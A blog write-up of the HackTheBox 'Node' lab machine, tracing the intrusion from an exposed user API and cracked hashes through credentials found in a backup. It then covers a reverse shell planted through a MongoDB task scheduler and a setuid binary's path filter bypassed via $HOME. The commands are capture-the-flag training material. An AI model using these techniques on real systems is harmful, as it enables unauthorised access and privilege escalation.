---
layout: post
title: HackTheBox - Node Writeup
tags: [hackthebox]
---

This is probably one of the best boxes released on HTB thus far. Each step felt like a treasure hunt, also I really enjoyed getting more familiar with MongoDB as well. Do yourself a favor and go do this box! 

![node](/img/node.png)

## Enumeration

As always a quick nmap scan to get things started.

```
root@kali:~/htb/node# nmap -sV 10.10.10.58

Starting Nmap 7.50 ( https://nmap.org ) 
Nmap scan report for 10.10.10.58
Host is up (0.10s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
3000/tcp open  http    Node.js Express framework
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Opening up a browser to port 3000 we're presented with a webpage.

![MYPLACE](/img/node-myplace.png)

Since this box is running Node JS we can also assume it's using MongoDB for it's backend. At the login page I tried some simple NoSQL injection commands but was unsuccessful. Moving on and opening up developer tools in the browser we see a few JS files that are of interest. In particular `profile.js`.

```javascript

var controllers = angular.module('controllers');

controllers.controller('ProfileCtrl', function ($scope, $http, $routeParams) {
  $http.get('/api/users/' + $routeParams.username)
    .then(function (res) {
      $scope.user = res.data;
    }, function (res) {
      $scope.hasError = true;

      if (res.status == 404) {
        $scope.errorMessage = 'This user does not exist';
      }
      else {
        $scope.errorMessage = 'An unexpected error occurred';
      }
    });
});
```
If we take a look at `/api/users` we are presented with the following:

![USERS](/img/node-users.png)

Great, so now we have some hashes and one account that seems to be an admin.

Let's identify the hashes.

```
root@kali:~/htb/node# hash-identifier
   #########################################################################
   #	 __  __ 		    __		 ______    _____	   #
   #	/\ \/\ \		   /\ \ 	/\__  _\  /\  _ `\	   #
   #	\ \ \_\ \     __      ____ \ \ \___	\/_/\ \/  \ \ \/\ \	   #
   #	 \ \  _  \  /'__`\   / ,__\ \ \  _ `\	   \ \ \   \ \ \ \ \	   #
   #	  \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \	    \_\ \__ \ \ \_\ \	   #
   #	   \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/	   #
   #	    \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.1 #
   #								 By Zion3R #
   #							www.Blackploit.com #
   #						       Root@Blackploit.com #
   #########################################################################

   -------------------------------------------------------------------------
 HASH: dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af

Possible Hashs:
[+]  SHA-256
[+]  Haval-256
```

Now we'll run hashcat.

```
C:\hashcat-3.5.0> .\hashcat64.exe -m 1400 -a 0 .\nodehashes.txt .\rockyou.txt
hashcat (v3.5.0) starting...

Dictionary cache hit:
* Filename..: .\rockyou.txt
* Passwords.: 14343296
* Bytes.....: 139921497
* Keyspace..: 14343296

f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240:spongebob
de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73:snowflake
dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af:manchester
Approaching final keyspace - workload adjusted.
```

Our admin user's password is `manchester`. After logging in we're presented with the following: 

![MYPLACEADMIN](/img/node-myplaceadmin.png)

## Exploitation

From here we download the backup file and have a look. Inside is what looks to be base64 encoding. After decoding into another file we are presented with a zip file that requires a password. 

```
root@kali:~/htb/node# cat myplace.backup | base64 --decode > backup
root@kali:~/htb/node# file backup
backup: Zip archive data, at least v1.0 to extract
root@kali:~/htb/node# unzip backup 
Archive:  backup
   creating: var/www/myplace/
[backup] var/www/myplace/package-lock.json password: 
   skipping: var/www/myplace/package-lock.json  incorrect password
```

To crack the password we can use `fcrackzip`.

```
root@kali:~/htb/node# fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup 


PASSWORD FOUND!!!!: pw == magicword
```

After unzipping and looking around we find the app.js file.

```
root@kali:~/htb/node/var/www/myplace# cat app.js

const express     = require('express');
const session     = require('express-session');
const bodyParser  = require('body-parser');
const crypto      = require('crypto');
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const path        = require("path");
const spawn        = require('child_process').spawn;
const app         = express();
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
```

This gives us mark's password as `5AYRft73VtFpc84k`. With these credentials we are able to ssh into the box as mark.

```
root@kali:~/htb/node# ssh mark@10.10.10.58
The authenticity of host '10.10.10.58 (10.10.10.58)' can't be established.
ECDSA key fingerprint is SHA256:I0Y7EMtrkyc9Z/92jdhXQen2Y8Lar/oqcDNLHn28Hbs.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.58' (ECDSA) to the list of known hosts.
mark@10.10.10.58's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.



              .-. 
        .-'``(|||) 
     ,`\ \    `-`.                 88                         88 
    /   \ '``-.   `                88                         88 
  .-.  ,       `___:      88   88  88,888,  88   88  ,88888, 88888  88   88 
 (:::) :        ___       88   88  88   88  88   88  88   88  88    88   88 
  `-`  `       ,   :      88   88  88   88  88   88  88   88  88    88   88 
    \   / ,..-`   ,       88   88  88   88  88   88  88   88  88    88   88 
     `./ /    .-.`        '88888'  '88888'  '88888'  88   88  '8888 '88888' 
        `-..-(   ) 
              `-` 




The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Sep 27 02:33:14 2017 from 10.10.14.3
mark@node:~$

```

Mark is only the initial foothold here and we need to escalate to tom since he has the user.txt flag in his home directory. We see that tom has two processes running currently.

```
mark@node:/home/tom$ ps -ef | grep tom
tom       1206     1  0 Jan02 ?        00:00:13 /usr/bin/node /var/scheduler/app.js
tom       1212     1  0 Jan02 ?        00:00:13 /usr/bin/node /var/www/myplace/app.js
mark     16170 16147  0 21:58 pts/0    00:00:00 grep --color=auto tom
```

If we take a look at /var/scheduler/app.js we can see what's going on.

```
mark@node:/var/scheduler$ cat app.js
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});
```

First we see the connection to the `scheduler` database along with marks credentials. Going further down into the `setInterval` function we can see that if there is a doc in the `tasks` collection, then it will execute whatever is under the `cmd` value and then delete the doc from the collection.

Let's connect into the scheduler database as mark.

```
mark@node:/var/scheduler$ mongo -u mark -p 5AYRft73VtFpc84k 
MongoDB shell version: 3.2.16
connecting to: scheduler
> show collections
tasks
> db.tasks.find()
```  

We see the tasks collection and also that there are no docs currently inside of it. Under /tmp we create a file `shell.sh` with a simple bash reverse shell and then add our doc to call it under the `cmd` value. We also verify our doc has been created by using the `db.tasks.find()` command.

```
mark@node:/var/scheduler$ vim /tmp/shell.sh
mark@node:/var/scheduler$ chmod +x /tmp/shell.sh 
mark@node:/var/scheduler$ mongo -u mark -p 5AYRft73VtFpc84k scheduler
MongoDB shell version: 3.2.16
connecting to: scheduler
> db.tasks.insertOne( { cmd: "bash /tmp/shell.sh" });
{
	"acknowledged" : true,
	"insertedId" : ObjectId("5a4e6c07173a67d8b6172d55")
}
> db.tasks.find()
{ "_id" : ObjectId("5a4e6c07173a67d8b6172d55"), "cmd" : "bash /tmp/shell.sh" }

```

 Let's start a netcat listener and wait to catch our shell.

```
root@kali:~/htb/node# nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.58] 51644
bash: cannot set terminal process group (1206): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

tom@node:~$ id
id
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1002(admin
```

And now we can grab the user.txt flag!

### Grabbing the root flag

We still need to get the root.txt flag. We find an interesting setuid that tom has access to execute since he is in the `admin` group.

```
tom@node:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/local/bin/backup
/usr/bin/chfn
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/newuidmap
/bin/ping
/bin/umount
/bin/fusermount
/bin/ping6
/bin/ntfs-3g
/bin/su
/bin/mount

tom@node:~$ ls -al /usr/local/bin/backup
ls -al /usr/local/bin/backup
-rwsr-xr-- 1 root admin 16484 Sep  3 11:30 /usr/local/bin/backup
```

```
tom@node:/usr/local/bin$ file backup
backup: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=343cf2d93fb2905848a42007439494a2b4984369, not stripped
```

Let's check out the `backup` binary in strings.

```
tom@node:/usr/local/bin$ strings backup
~
~
~
 %s[+]%s Starting archiving %s
             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   |             Secure Backup v1.0              |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'
Could not open file
Validated access token
Ah-ah-ah! You didn't say the magic word!
Finished! Encoded backup is below:
UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==
/root
/etc
/tmp/.backup_%i
/usr/bin/zip -r -P magicword %s %s > /dev/null
/usr/bin/base64 -w0 %s
The target path doesn't exist
~
~
```

So based off this output, we can see this is what created the backup file we originally downloaded. 

If we try to run the binary by itself we get no output and nothing happens. If we put three separate parameters in we finally get it to run. 

```
tom@node:/usr/local/bin$ backup test test test



             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |             Secure Backup v1.0              |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'


 [!] Ah-ah-ah! You didn't say the magic word!

```

It seems to be checking for a password in one of the parameter fields. Let's run the binary through `ltrace`.

```
tom@node:/usr/local/bin$ ltrace backup test1 test2 test3

~
~
~
strncpy(0xffee8de8, "test2", 100)                = 0xffee8de8
strcpy(0xffee8dd1, "/")                          = 0xffee8dd1
strcpy(0xffee8ddd, "/")                          = 0xffee8ddd
strcpy(0xffee8d67, "/e")                         = 0xffee8d67
strcat("/e", "tc")                               = "/etc"
strcat("/etc", "/m")                             = "/etc/m"
strcat("/etc/m", "yp")                           = "/etc/myp"
strcat("/etc/myp", "la")                         = "/etc/mypla"
strcat("/etc/mypla", "ce")                       = "/etc/myplace"
strcat("/etc/myplace", "/k")                     = "/etc/myplace/k"
strcat("/etc/myplace/k", "ey")                   = "/etc/myplace/key"
strcat("/etc/myplace/key", "s")                  = "/etc/myplace/keys"
fopen("/etc/myplace/keys", "r")                  = 0x9bdb410
fgets("a01a6aa5aaf1d7729f35c8278daae30f"..., 1000, 0x9bdb410) = 0xffee897f
strcspn("a01a6aa5aaf1d7729f35c8278daae30f"..., "\n") = 64
strcmp("test2", "a01a6aa5aaf1d7729f35c8278daae30f"...) = 1
fgets("45fac180e9eee72f4fd2d9386ea7033e"..., 1000, 0x9bdb410) = 0xffee897f
strcspn("45fac180e9eee72f4fd2d9386ea7033e"..., "\n") = 64
strcmp("test2", "45fac180e9eee72f4fd2d9386ea7033e"...) = 1
fgets("3de811f4ab2b7543eaf45df611c2dd25"..., 1000, 0x9bdb410) = 0xffee897f
strcspn("3de811f4ab2b7543eaf45df611c2dd25"..., "\n") = 64
strcmp("test2", "3de811f4ab2b7543eaf45df611c2dd25"...) = 1
fgets("\n", 1000, 0x9bdb410)                     = 0xffee897f
strcspn("\n", "\n")                              = 0
strcmp("test2", "")                              = 1
fgets(nil, 1000, 0x9bdb410)                      = 0
strcpy(0xffee79b8, "Ah-ah-ah! You didn't say the mag"...) = 0xffee79b8
printf(" %s[!]%s %s\n", "\033[33m", "\033[37m", "Ah-ah-ah! You didn't say the mag"... [!] Ah-ah-ah! You didn't say the magic word!
~
~
~
```

We can see the binary opening up `/etc/myplace/keys` and then doing a compare against our second parameter for a match.

```
tom@node:/etc/myplace$ cat keys
a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
```

If we plug in one of these keys as our second parameter we're able to get a different output from the binary.

```
tom@node:/usr/local/bin$ backup test1 a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 test2
                   



             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |             Secure Backup v1.0              |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'


 [+] Validated access token
 [+] Starting archiving test2
 [!] The target path doesn't exist

```

Okay so our last parameter seems to be the path that will get backed up and converted into base64. Let's create a test file under /tmp and verify this.

```
tom@node:/usr/local/bin$ backup test a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 /tmp/test
                 



             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |             Secure Backup v1.0              |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'


 [+] Validated access token
 [+] Starting archiving /tmp/test
 [+] Finished! Encoded backup is below:

UEsDBAoACQAAABKgJEzGNbk7EQAAAAUAAAAIABwAdG1wL3Rlc3RVVAkAA+OHTlrke05adXgLAAEE6AMAAAToAwAAh1473xIcj1cLIwKisdB8INlQSwcIxjW5OxEAAAAFAAAAUEsBAh4DCgAJAAAAEqAkTMY1uTsRAAAABQAAAAgAGAAAAAAAAQAAAKSBAAAAAHRtcC90ZXN0VVQFAAPjh05adXgLAAEE6AMAAAToAwAAUEsFBgAAAAABAAEATgAAAGMAAAAAAA==
```

This is exactly what we wanted. But if we try to go straight for the root.txt flag we are unsuccessful and just get the base64 that we already saw from the `strings` command. Let's see what's going on again with `ltrace`. 

```
tom@node:/usr/local/bin$ ltrace backup test a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 /tmp/test

~
~
strstr("/tmp/test", "..")                        = nil
strstr("/tmp/test", "/root")                     = nil
strchr("/tmp/test", ';')                         = nil
strchr("/tmp/test", '&')                         = nil
strchr("/tmp/test", '`')                         = nil
strchr("/tmp/test", '$')                         = nil
strchr("/tmp/test", '|')                         = nil
strstr("/tmp/test", "//")                        = nil
strcmp("/tmp/test", "/")                         = 1
strstr("/tmp/test", "/etc")
~
~
```

If we run with our successful payload we can see all the checks the binary goes through. So as we can see here `/root` is getting checked for as well a handful of others. So how can we get around this? Well one character that is not getting checked for is the `~`. The `~` is used to specify a user's home directory and more specifically whatever is defined in the `$HOME` environment variable. So if we set `$HOME` to `/root` we will be able to bypass the filter.

```
tom@node:/usr/local/bin$ export HOME=/root/

tom@node:/usr/local/bin$ backup test a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 "~"
```

From here we can copy the base64 output over and do what we did earlier, decode and unzip to grab our flag!

```
root@kali:~/htb/node# cat root_base64 | base64 --decode > root_backup
root@kali:~/htb/node# unzip root_backup 
Archive:  root_backup
   creating: root/
[root_backup] root/.profile password: 
  inflating: root/.profile           
  inflating: root/.bash_history      
   creating: root/.cache/
 extracting: root/.cache/motd.legal-displayed  
 extracting: root/root.txt           
  inflating: root/.bashrc            
  inflating: root/.viminfo           
   creating: root/.nano/
 extracting: root/.nano/search_history 

root@kali:~/htb/node/root# cat root.txt 
```
